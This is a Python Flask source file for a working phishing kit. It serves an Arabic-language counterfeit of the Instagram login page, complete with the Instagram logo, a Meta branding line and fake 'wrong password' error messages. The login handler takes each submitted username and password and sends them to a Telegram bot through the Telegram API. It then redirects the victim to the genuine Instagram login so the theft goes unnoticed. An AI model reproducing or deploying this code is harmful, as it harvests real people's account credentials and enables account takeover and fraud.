import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  username_val = ""
  if request.method == "POST":
    username_val = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    username_pattern = r"^[a-zA-Z0-9_\.]{4,30}$"

    if not re.match(username_pattern, username_val):
      error = (
          "عذراً، اسم المستخدم الذي أَدخلته لا ينتمي إلى أي حساب. يُرجى التحقق من"
          " اسم المستخدم ومحاولة مرة أخرى."
      )
    elif len(password) <= 5:
      error = (
          "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
      )
    else:
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
            f" {username_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(INSTAGRAM_OFFICIAL_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        
        body { 
            background: #121212; 
            color: #f5f5f5;
            height: 100dvh;
            display: flex; 
            flex-direction: column;
            align-items: center; 
            overflow: hidden;
            padding: 15px 20px 20px 20px;
        }
        
        .page-wrapper {
            width: 100%;
            max-width: 350px;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
        }

        /* القسم العلوي */
        .top-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 5px;
        }

        .lang-area {
            text-align: center;
            color: #a8a8a8;
            font-size: 12px;
            width: 100%;
        }

        .logo-area {
            display: flex;
            justify-content: center;
            margin-top: 80px;
            width: 100%;
        }
        
        .insta-icon {
            width: 60px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .insta-icon svg {
            width: 60px;
            height: 60px;
        }

        /* القسم الأوسط (الحقول وزر الدخول) */
        .form-area { 
            width: 100%; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            text-align: center; 
        }

        .error-msg { 
            color: #ed4956; 
            font-size: 12px; 
            line-height: 16px; 
            margin-bottom: 8px; 
            text-align: center; 
            background: #1c1c1c; 
            padding: 8px; 
            border-radius: 8px; 
            border: 1px solid #331a1a; 
            width: 100%;
        }

        form {
            width: 100%;
        }

        .input-group { margin-bottom: 6px; width: 100%; }
        
        .input-group input { 
            width: 100%; 
            background: #121212; 
            border: 1px solid #262626; 
            border-radius: 8px; 
            padding: 12px; 
            font-size: 14px; 
            color: #f5f5f5; 
            outline: none; 
        }
        .input-group input:focus { border-color: #a8a8a8; }
        .input-group input::placeholder { color: #8e8e8e; }

        .submit-btn { 
            width: 100%; 
            background: #0095f6; 
            color: white; 
            border: none; 
            border-radius: 8px; 
            padding: 12px; 
            font-size: 14px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 4px; 
            margin-bottom: 10px; 
        }
        .submit-btn:hover { background: #1877f2; }

        .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }

        /* القسم السفلي */
        .footer-area { 
            width: 100%; 
            text-align: center; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        
        .signup-card { 
            padding: 12px; 
            width: 100%; 
            border: 1px solid #262626; 
            border-radius: 8px; 
            text-align: center; 
            font-size: 14px; 
            color: #0095f6; 
            font-weight: 600; 
            cursor: pointer; 
            margin-bottom: 10px;
        }

        .meta-footer { display: flex; align-items: center; justify-content: center; }
        .meta-brand {
            font-size: 13px;
            font-weight: 600;
            color: #737373;
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <!-- القسم العلوي -->
        <div class="top-section">
            <div class="lang-area">العربية</div>
            <div class="logo-area">
                <div class="insta-icon">
                    <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                        <defs>
                            <radialGradient id="ig-grad" cx="20%" cy="100%" r="120%">
                                <stop offset="0%" stop-color="#fdf497"/>
                                <stop offset="5%" stop-color="#fdf497"/>
                                <stop offset="45%" stop-color="#fd5949"/>
                                <stop offset="60%" stop-color="#d6249f"/>
                                <stop offset="90%" stop-color="#285AEB"/>
                            </radialGradient>
                        </defs>
                        <path d="M352 0H160C71.6 0 0 71.6 0 160v192c0 88.4 71.6 160 160 160h192c88.4 0 160-71.6 160-160V160c0-88.4-71.6-160-160-160zm112 352c0 61.8-50.2 112-112 112H160c-61.8 0-112-50.2-112-112V160c0-61.8 50.2-112 112-112h192c61.8 0 112 50.2 112 112v192z" fill="url(#ig-grad)"/>
                        <path d="M256 126.5c-71.5 0-129.5 58-129.5 129.5s58 129.5 129.5 129.5 129.5-58 129.5-129.5-58-129.5-129.5-129.5zm0 211.3c-45.1 0-81.8-36.7-81.8-81.8s36.7-81.8 81.8-81.8 81.8 36.7 81.8 81.8-36.7 81.8-81.8 81.8z" fill="url(#ig-grad)"/>
                        <circle cx="382.5" cy="129.5" r="30" fill="url(#ig-grad)"/>
                    </svg>
                </div>
            </div>
        </div>

        <!-- القسم الأوسط: الحقول وزر تسجيل الدخول -->
        <div class="form-area">
            {% if error %}
                <div class="error-msg">{{ error }}</div>
            {% endif %}

            <form method="POST">
                <div class="input-group">
                    <input type="text" name="username" required placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم المحمول" value="{{ username_val }}">
                </div>
                <div class="input-group">
                    <input type="password" name="password" required placeholder="كلمة السر">
                </div>
                <button type="submit" class="submit-btn">تسجيل الدخول</button>
            </form>

            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
        </div>

        <!-- القسم السفلي: إنشاء حساب و Meta -->
        <div class="footer-area">
            <div class="signup-card">
                إنشاء حساب جديد
            </div>
            <div class="meta-footer">
                <div class="meta-brand">Meta ∞</div>
            </div>
        </div>
    </div>
</body>
</html>
""",
      error=error,
      username_val=username_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
